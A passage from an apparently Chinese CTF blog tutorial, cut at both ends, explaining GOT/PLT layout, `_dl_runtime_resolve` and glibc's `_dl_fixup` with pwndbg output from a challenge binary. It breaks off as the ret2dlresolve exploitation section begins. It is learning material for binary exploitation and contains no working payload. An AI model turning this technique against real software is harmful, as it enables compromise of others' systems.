PTR [rip+0x2f8d]        # 0x404028 &lt;setbuf@got.plt&gt;</span><br></pre></td></tr></table></figure><p>就是仅仅跳转到<code>got</code>表项存放的地址处</p><h4 id="GOT-（-got-got-plt）"><a href="#GOT-（-got-got-plt）" class="headerlink" title="GOT （.got&#x2F;.got.plt）"></a>GOT （.got&#x2F;.got.plt）</h4><p>ELF 将 GOT 拆分成了两个表叫做 <code>.got</code> 和 <code>.got.plt</code> 。其中 <code>.got</code> 用来保存全局变量引用的地址，<code>.got.plt</code> 用来保存函数引用的地址，也就是说，所有对于外部函数的引用全部被分离出来放到了 <code>.got.plt</code> 中（当然有的 ELF 文件可能吧这两个表合并为一个 <code>.got</code> 表，结构等同于后面提到的 <code>.got.plt</code>）。另外 <code>.got.plt</code> 还有一个特殊的地方是它的前三项是有特殊意义的，分别含义如下：</p><ul><li><p>第一项保存的是 <code>.dynamic</code> 段的偏移（也有可能是 <code>.dynamic</code> 段的地址）。 </p></li><li><p>第二项是一个 <code>link_map</code> 的结构体指针，里面保存着动态链接的一些相关信息，是重定位函数 <code>_dl_runtime_resolve</code> 的第一个参数。 </p></li><li><p>第三项保存的是 <code>_dl_runtime_resolve</code> 的地址。</p></li></ul><p>我们查看一下前几个表项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x404000 3</span><br><span class="line">00:0000│  0x404000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x403e20 (_DYNAMIC) ◂— 1</span><br><span class="line">01:0008│  0x404008 (_GLOBAL_OFFSET_TABLE_+8) —▸ 0x7ffff7ffe190 ◂— 0</span><br><span class="line">02:0010│  0x404010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0x7ffff7fe7bc0 ◂— endbr64</span><br></pre></td></tr></table></figure><p>第一项<code>0x403e20</code>正是<code>.dynamic</code>的偏移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; elfsections</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">             Start                End     Perm       Size  Name</span><br><span class="line">          0x3fc3c0           0x3fc43b      RW-       0x7b  .interp</span><br><span class="line">          0x3fe3a8           0x3fe3c8      RW-       0x20  .note.gnu.property</span><br><span class="line">          0x3fe3c8           0x3fe3ec      RW-       0x24  .note.gnu.build-id</span><br><span class="line">          0x3fe3f0           0x3fe410      RW-       0x20  .note.ABI-tag</span><br><span class="line">          0x3fe410           0x3fe440      RW-       0x30  .gnu.hash</span><br><span class="line">          0x3fe440           0x3fe530      RW-       0xf0  .dynsym</span><br><span class="line">          0x3fe530           0x3fe605      RW-       0xd5  .dynstr</span><br><span class="line">          0x400526           0x40053a      R--       0x14  .gnu.version</span><br><span class="line">          0x400540           0x400560      R--       0x20  .gnu.version_r</span><br><span class="line">          0x400560           0x4005d8      R--       0x78  .rela.dyn</span><br><span class="line">          0x4005d8           0x400638      R--       0x60  .rela.plt</span><br><span class="line">          0x401000           0x40101b      R-X       0x1b  .init</span><br><span class="line">          0x401020           0x401070      R-X       0x50  .plt</span><br><span class="line">          0x401070           0x4010b0      R-X       0x40  .plt.sec</span><br><span class="line">          0x4010b0           0x4012a5      R-X      0x1f5  .text</span><br><span class="line">          0x4012a8           0x4012b5      R-X        0xd  .fini</span><br><span class="line">          0x402000           0x402004      R--        0x4  .rodata</span><br><span class="line">          0x402004           0x402050      R--       0x4c  .eh_frame_hdr</span><br><span class="line">          0x402050           0x402170      R--      0x120  .eh_frame</span><br><span class="line">          0x403e10           0x403e18      R--        0x8  .init_array</span><br><span class="line">          0x403e18           0x403e20      R--        0x8  .fini_array</span><br><span class="line">          0x403e20           0x403ff0      R--      0x1d0  .dynamic</span><br><span class="line">          0x403ff0           0x404000      R--       0x10  .got</span><br><span class="line">          0x404000           0x404038      RW-       0x38  .got.plt</span><br><span class="line">          0x404040           0x4040c4      RW-       0x84  .data</span><br><span class="line">          0x4040e0           0x404110      RW-       0x30  .bss</span><br></pre></td></tr></table></figure><p>第二项，是程序自身的<code>link_map</code>结点指针</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x7ffff7ffe190</span><br><span class="line">00:0000│  0x7ffff7ffe190 ◂— 0</span><br><span class="line">01:0008│  0x7ffff7ffe198 —▸ 0x7ffff7ffe730 ◂— 0</span><br><span class="line">02:0010│  0x7ffff7ffe1a0 —▸ 0x403e20 (_DYNAMIC) ◂— 1</span><br><span class="line">03:0018│  0x7ffff7ffe1a8 —▸ 0x7ffff7ffe740 —▸ 0x7ffff7fcd000 ◂— jg 0x7ffff7fcd047</span><br><span class="line">04:0020│  0x7ffff7ffe1b0 ◂— 0</span><br><span class="line">05:0028│  0x7ffff7ffe1b8 —▸ 0x7ffff7ffe190 ◂— 0</span><br><span class="line">06:0030│  0x7ffff7ffe1c0 ◂— 0</span><br><span class="line">07:0038│  0x7ffff7ffe1c8 —▸ 0x7ffff7ffe718 —▸ 0x7ffff7ffe730 ◂— 0</span><br><span class="line">pwndbg&gt; tele 0x7ffff7ffe740</span><br><span class="line">00:0000│  0x7ffff7ffe740 —▸ 0x7ffff7fcd000 ◂— jg 0x7ffff7fcd047</span><br><span class="line">01:0008│  0x7ffff7ffe748 —▸ 0x7ffff7ffebf0 ◂— &#x27;linux-vdso.so.1&#x27;</span><br><span class="line">02:0010│  0x7ffff7ffe750 —▸ 0x7ffff7fcd3e0 ◂— 0xe</span><br><span class="line">03:0018│  0x7ffff7ffe758 —▸ 0x7ffff7fc7000 —▸ 0x7ffff7dd5000 ◂— 0x3010102464c457f</span><br><span class="line">04:0020│  0x7ffff7ffe760 —▸ 0x7ffff7ffe190 ◂— 0</span><br><span class="line">05:0028│  0x7ffff7ffe768 —▸ 0x7ffff7ffe740 —▸ 0x7ffff7fcd000 ◂— jg 0x7ffff7fcd047</span><br><span class="line">06:0030│  0x7ffff7ffe770 ◂— 0</span><br><span class="line">07:0038│  0x7ffff7ffe778 —▸ 0x7ffff7ffebc8 —▸ 0x7ffff7ffebf0 ◂— &#x27;linux-vdso.so.1&#x27;</span><br></pre></td></tr></table></figure><p>至于第三项，自然就是 <code>_dl_runtime_resolve</code> 地址。至于函数的<code>got</code>表项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; got</span><br><span class="line">Filtering out read-only entries (display them with -r or --show-readonly)</span><br><span class="line"></span><br><span class="line">State of the GOT of /home/r3t2/ctf/moectf2025/pwn/nowaytoleak/pwn_patched:</span><br><span class="line">GOT protection: Partial RELRO | Found 4 GOT entries passing the filter</span><br><span class="line">[0x404018] write@GLIBC_2.2.5 -&gt; 0x401030 ◂— endbr64</span><br><span class="line">[0x404020] strlen@GLIBC_2.2.5 -&gt; 0x401040 ◂— endbr64</span><br><span class="line">[0x404028] setbuf@GLIBC_2.2.5 -&gt; 0x401050 ◂— endbr64</span><br><span class="line">[0x404030] read@GLIBC_2.2.5 -&gt; 0x401060 ◂— endbr64</span><br><span class="line">pwndbg&gt; x/8i 0x401030</span><br><span class="line">   0x401030:    endbr64</span><br><span class="line">   0x401034:    push   0x0</span><br><span class="line">   0x401039:    bnd jmp 0x401020</span><br><span class="line">   0x40103f:    nop</span><br><span class="line">   0x401040:    endbr64</span><br><span class="line">   0x401044:    push   0x1</span><br><span class="line">   0x401049:    bnd jmp 0x401020</span><br><span class="line">   0x40104f:    nop</span><br></pre></td></tr></table></figure><p>看解析前函数<code>got</code>表项的地址处的指令，正是<code>push reloc_index; jmp plt[0]</code>，且正位于<code>plt[0]</code>下方<br>解析后（ <code>_dl_runtime_resolve</code> 函数的工作）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; got</span><br><span class="line">Filtering out read-only entries (display them with -r or --show-readonly)</span><br><span class="line"></span><br><span class="line">State of the GOT of /home/r3t2/ctf/moectf2025/pwn/nowaytoleak/pwn_patched:</span><br><span class="line">GOT protection: Partial RELRO | Found 4 GOT entries passing the filter</span><br><span class="line">[0x404018] write@GLIBC_2.2.5 -&gt; 0x7ffff7ee3280 (write) ◂— endbr64</span><br><span class="line">[0x404020] strlen@GLIBC_2.2.5 -&gt; 0x7ffff7f5d900 ◂— endbr64</span><br><span class="line">[0x404028] setbuf@GLIBC_2.2.5 -&gt; 0x7ffff7e60ad0 (setbuf) ◂— endbr64</span><br><span class="line">[0x404030] read@GLIBC_2.2.5 -&gt; 0x401060 ◂— endbr64</span><br></pre></td></tr></table></figure><p>调用过的函数<code>got</code>表项存放的就是<code>libc</code>中的地址了。</p><h2 id="0x02-dl-runtime-resolve函数"><a href="#0x02-dl-runtime-resolve函数" class="headerlink" title="0x02 _dl_runtime_resolve函数"></a>0x02 _dl_runtime_resolve函数</h2><h4 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">  Elf64_Sxwordd_tag;<span class="comment">/* Dynamic entry type */</span>  </span><br><span class="line">  <span class="class"><span class="keyword">union</span>  </span></span><br><span class="line"><span class="class">    &#123;</span>  </span><br><span class="line">      Elf64_Xword d_val;<span class="comment">/* Integer value */</span>  </span><br><span class="line">      Elf64_Addr d_ptr;<span class="comment">/* Address value */</span>  </span><br><span class="line">    &#125; d_un;  </span><br><span class="line">&#125; Elf64_Dyn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Wordst_name;<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>st_info;<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Sectionst_shndx;<span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addrst_value;<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xwordst_size;<span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addrr_offset;<span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xwordr_info;<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf64_Rel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addrr_offset;<span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xwordr_info;<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxwordr_addend;<span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_SYM(i)                        ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_TYPE(i)                        ((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">                             ELF 文件 (可执行文件或共享库)</span><br><span class="line">                                     │</span><br><span class="line">                                     ▼</span><br><span class="line">        +-------------------------------------------------------------+</span><br><span class="line">        |                        .dynamic (段)                         |</span><br><span class="line">        |                  (包含多个 Elf64_Dyn 结构体)                   |</span><br><span class="line">        +-------------------------------------------------------------+</span><br><span class="line">        │  (动态加载器 ld.so 读取此段, 找到所有需要的动态信息表的地址)</span><br><span class="line">        │</span><br><span class="line">        ├─ d_tag: DT_SYMTAB  ─ d_un.d_ptr ─▶ .dynsym (动态符号表, Elf64_Sym[])</span><br><span class="line">        │</span><br><span class="line">        ├─ d_tag: DT_STRTAB  ─ d_un.d_ptr ─▶ .dynstr (动态字符串表)</span><br><span class="line">        │</span><br><span class="line">        ├─ d_tag: DT_JMPREL  ─ d_un.d_ptr ─▶ .rela.plt (PLT的重定位表, Elf64_Rela[])</span><br><span class="line">        │</span><br><span class="line">        └─ d_tag: DT_PLTGOT  ─ d_un.d_ptr ─▶ .got.plt (全局偏移量表的一部分)</span><br><span class="line">                                             │</span><br><span class="line">                                             └──────────────┐</span><br><span class="line">                                                            │</span><br><span class="line">  (第N次调用某函数时, 直接通过 GOT 跳转)                         │ (地址回填的目标)</span><br><span class="line">                                                            │</span><br><span class="line">┌───────────────────────────────────────────────────────────┘</span><br><span class="line">│</span><br><span class="line">│ 第一次调用函数 (例如 `puts@plt`) 时触发解析流程：</span><br><span class="line">│</span><br><span class="line">│ 1. PLT 代码跳转到动态加载器 (ld.so) 的符号解析函数 `_dl_runtime_resolve`</span><br><span class="line">│</span><br><span class="line">│ 2. 解析器根据传入的索引 `j`, 定位到 .rela.plt[j]</span><br><span class="line">│</span><br><span class="line">│</span><br><span class="line">▼</span><br><span class="line">+---------------------------------+</span><br><span class="line">|      .rela.plt[j]               |</span><br><span class="line">|      (Elf64_Rela 结构体)         |</span><br><span class="line">+---------------------------------+</span><br><span class="line">     │                          │</span><br><span class="line">     │ r_offset: VAddr          │ r_info: (i &lt;&lt; 32) | type</span><br><span class="line">     │ (要回填的地址, 通常在.got.plt内) │ (高32位是符号索引 i, 低32位是重定位类型)</span><br><span class="line">     │                          │</span><br><span class="line">     └───────────┐              └───────────┐</span><br><span class="line">                 │                          │</span><br><span class="line">                 │                          ▼</span><br><span class="line">                 │             +---------------------------------+</span><br><span class="line">                 │             |      .dynsym[i]                 |</span><br><span class="line">                 │             |      (Elf64_Sym 结构体)          |</span><br><span class="line">                 │             +---------------------------------+</span><br><span class="line">                 │                          │</span><br><span class="line">                 │                          │ st_name: offset (字符串偏移)</span><br><span class="line">                 │                          │</span><br><span class="line">                 │                          └───────────┐</span><br><span class="line">                 │                                      │</span><br><span class="line">                 │                                      ▼</span><br><span class="line">                 │             +---------------------------------+</span><br><span class="line">                 │             |      .dynstr (字符串池)          |</span><br><span class="line">                 │             +---------------------------------+</span><br><span class="line">                 │                          │</span><br><span class="line">                 │                          ▼</span><br><span class="line">                 │                      符号名字符串 (例如 &quot;puts&quot;)</span><br><span class="line">                 │</span><br><span class="line">                 │</span><br><span class="line">                 │ 3. 动态加载器在所有已加载的库中查找这个符号 (&quot;puts&quot;)</span><br><span class="line">                 │</span><br><span class="line">                 │ 4. 找到 &quot;puts&quot; 在 libc.so 中的真实地址 (假设为 0xDEADBEEF)</span><br><span class="line">                 │</span><br><span class="line">                 ▼</span><br><span class="line">+---------------------------------+</span><br><span class="line">|      .got.plt[k]                | ──────▶  将地址 0xDEADBEEF 写入这里</span><br><span class="line">| (地址由 r_offset 指向)         |</span><br><span class="line">+---------------------------------+</span><br><span class="line">  (写入前: 指向PLT的下一条指令)</span><br><span class="line">  (写入后: 存储函数真实地址 0xDEADBEEF)</span><br></pre></td></tr></table></figure><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><p>源码比较长，位于<code>glibc/elf/dl-runtime.c</code>，这里就不写读源码的流水账了，放上大佬整理后的核心逻辑<code>Orz</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup(truct link_map *l, ElfW(Word) reloc_arg) &#123;</span><br><span class="line">    <span class="comment">// 获取符号表地址</span></span><br><span class="line">    <span class="meta"># <span class="keyword">define</span> D_PTR(map, i) ((map)-&gt;i-&gt;d_un.d_ptr + (map)-&gt;l_addr)</span></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">    <span class="comment">// 获取字符串表地址</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line">    <span class="comment">// 获取函数对应的重定位表结构地址，sizeof (PLTREL) 即 Elf*_Rel 的大小。</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> reloc_offset reloc_arg * sizeof (PLTREL)</span></span><br><span class="line">    <span class="meta"># <span class="keyword">define</span> PLTREL  ElfW(Rel)</span></span><br><span class="line">    <span class="type">const</span> PLTREL *<span class="type">const</span> reloc = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    <span class="comment">// 获取函数对应的符号表结构地址</span></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    <span class="comment">// 得到函数对应的got地址，即真实函数地址要填回的地址</span></span><br><span class="line">    <span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *) (l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">    <span class="type">lookup_t</span> result;</span><br><span class="line">    DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断重定位表的类型，必须要为 ELF_MACHINE_JMP_SLOT(7)  这里还会检查reloc-&gt;r_info的最低位是不是R_386_JUMP_SLOT=7</span></span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">       used don&#x27;t look in the global scope.  */</span></span><br><span class="line">    <span class="comment">// ☆ 关键判断，决定目标函数地址的查找方法。☆</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX(DT_VERSYM)]);</span><br><span class="line">            ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">            version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">            <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">                version = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment">       not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment">       we are not using any threads (yet).  */</span></span><br><span class="line">        <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P) &#123;</span><br><span class="line">            THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">            flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">        RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="comment">// 查找目标函数地址</span></span><br><span class="line">        <span class="comment">// result 为 libc 的 link_map ，其中有 libc 的基地址。</span></span><br><span class="line">        <span class="comment">// sym 指针指向 libc 中目标函数对应的符号表，其中有目标函数在 libc 中的偏移。</span></span><br><span class="line">        result = _dl_lookup_symbol_x(strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">                                     version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">            THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">        RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment">       of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment">       offset.  */</span></span><br><span class="line">        <span class="comment">// 基址 + 偏移算出目标函数地址 value</span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS(result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment">       address) is also known.  */</span></span><br><span class="line">        <span class="comment">// 这里认为 link_map 和 sym 中已经是目标函数的信息了，因此直接计算目标函数地址。</span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">        result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">    value = elf_machine_plt_value(l, reloc, value);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">        &amp;&amp; __builtin_expect(ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">        value = elf_ifunc_invoke(DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    <span class="comment">// 更新 got 表</span></span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt(l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-ret2dlresolve"><a href="#0x03-ret2dlresolve" class="headerlink" title="0x03 ret2dlresolve"></a>0x03 ret2dlresolve</h2><h4 id="Notion"><a href="#Notion" class="headerlink" title="Notion"></a>Notion</h4><p><code>l_info[DT_STRTAB]</code>指针：位于<code>link_map_addr +0x68</code><br><code>l_info[DT_SYMTAB]</code>指针：位于<code>link_map_addr + 0x70</code><br><code>l_info[DT_JMPREL]</code>指针：位于<code>link_map_addr +0xF8</code><br><strong>64位下，<code>_dl_runtime_resolve</code>的参数仍然是用栈传递</strong></p><p>使用以下demo （方便演示手动加了<code>gadget</code>）</p><figure class="highlight c"><table><tr><td 